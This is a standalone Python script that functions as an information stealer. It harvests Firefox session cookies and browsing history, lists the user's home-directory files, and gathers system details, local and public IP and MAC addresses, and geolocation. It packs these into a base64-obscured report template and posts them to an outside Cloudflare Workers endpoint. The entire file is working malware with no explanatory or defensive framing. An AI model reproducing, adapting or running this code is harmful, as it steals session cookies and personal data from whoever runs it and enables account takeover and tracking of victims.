```python
import os
import sys
import json
import base64
import socket
import psutil
import pathlib
import getpass
import platform
import datetime
import requests
import sqlite_utils
home = pathlib.Path.home()
def get_moz():
	p = pathlib.Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
	t = ["cookies.sqlite", "places.sqlite"]
	c = []
	u = []
	if p.exists and p.is_dir():
		for d in p.rglob("*"):
			if d.is_file() and d.name == "cookies.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_cookies']
				for r in co.rows:
					c.append(r)
			elif d.is_file() and d.name == "places.sqlite":
				db = sqlite_utils.Database(d)
				co = db['moz_places']
				for r in co.rows:
					u.append(r['url'])
		return c, u
	return None, None
				
def format1(s, path=False):
	if not path:
		return str(s).replace("[","").replace("]","")
	return str(s).replace("[","").replace("]","").replace(",","\r\n").replace("'","")
		
def run_paths():
	f = []
	d = []
	for p in home.glob("*"):
		if p.is_dir():
			d.append(str(p))
		elif p.is_file():
			f.append(str(p))
	return d, f
	
def get_ip():
    try:
        ipv4 = []
        ipv6 = []
        mac = []
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ipv4.append(addr.address)
                elif addr.family == socket.AF_INET6:
                    ipv6.append(addr.address)
                elif addr.family in (psutil.AF_LINK, getattr(socket, "AF_PACKET", None)):
                    mac.append(addr.address)
        return ipv4, ipv6, mac
    except Exception as e:
        return str(e)
        
def public_ip():
	req = requests.get("https://api64.ipify.org/")
	if req.status_code == 200:
		return req.text
	else:
		return req.status_code
		
def ip_info():
	r = requests.get("http://ip-api.com/json/")
	if r.status_code == 200:
		j = json.loads(r.text)
		return j
	return None
	
def logged():
	u = []
	for it in psutil.users():
		u.append(it.name)
	return u

user = getpass.getuser()
exe = pathlib.Path(sys.executable).name
pts = run_paths()
time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
i = get_ip()
i_info = ip_info()
lo = format1(logged())
cc = psutil.cpu_count()
cf = psutil.cpu_freq().current
ram = psutil.virtual_memory().total // 1024 // 1024
i4 = format1(i[0])
i6 = format1(i[1])
mc = format1(i[2])
sy = platform.system()
nd = platform.node()
re = platform.release()
d_path = format1(pts[0], path=True)
f_path = format1(pts[1], path=True)
f_co = get_moz()
cookies = format1(f_co[0])
places = format1(f_co[1], path=True)

payload = f"{base64.b64decode(b'Ci0tLS0tLS0tLS0g8J2QlPCdkJLwnZCE8J2QkSDwnZCD8J2QgPCdkJPwnZCAIC0tLS0tLS0tLS0KCkV4ZWN1dGlvbiB0aW1lOiB7dGltZX0KClVzZXI6IHt1c2VyfQoKTG9nZ2VkIFVzZXJzOiB7bG99CgpDUFU6IHtjY30KCkNQVSBGcmVxdWVuY3k6IHtjZn0KClJBTToge3JhbX1NQgoKUHVibGljIElQOiB7cHVibGljX2lwKCl9CgpDb3VudHJ5OiB7aV9pbmZvWydjb3VudHJ5J119CgpSZWdpb246IHtpX2luZm9bJ3JlZ2lvbk5hbWUnXX0KCkNpdHk6IHtpX2luZm9bJ2NpdHknXX0KCklTUDoge2lfaW5mb1snaXNwJ119CgpPcmdhbml6YXRpb246IHtpX2luZm9bJ29yZyddfQoKQWxpYXM6IHtpX2luZm9bJ2FzJ119CgpJUHY0OiB7aTR9CgpJUHY2OiB7aTZ9CgpNQUM6IHttY30KClN5c3RlbToge3N5fQoKTm9kZToge25kfQoKVmVyc2lvbjoge3JlfQoKR29vZ2xlIE1hcHMgTGluazogaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3NlYXJjaC8/cT17aV9pbmZvWydsYXQnXX0se2lfaW5mb1snbG9uJ119CgotLS0tLS0tLSDwnZCF8J2QovCdkKXwnZCe8J2QrCDwnZCA8J2Qp/CdkJ0g8J2Qg/CdkKLwnZCr8J2QnvCdkJzwnZCt8J2QqPCdkKvwnZCi8J2QnvCdkKwgLS0tLS0tLS0tCgp7ZF9wYXRofQoKe2ZfcGF0aH0KCi0tLS0tLS0tLS0tLS0tLSDwnZCC8J2QqPCdkKjwnZCk8J2QovCdkJ7wnZCsIC0tLS0tLS0tLS0tLS0tLS0KCntjb29raWVzfQoKLS0tLS0tLS0tLS0g8J2QhfCdkKLwnZCr8J2QnvCdkJ/wnZCo8J2QsSDwnZCH8J2QovCdkKzwnZCt8J2QqPCdkKvwnZCyIC0tLS0tLS0tLS0tLQoKe3BsYWNlc30KCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0K')}"
content = json.dumps({"msg": payload})

r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
if r.status_code == 200:
	print("yes")
	

```
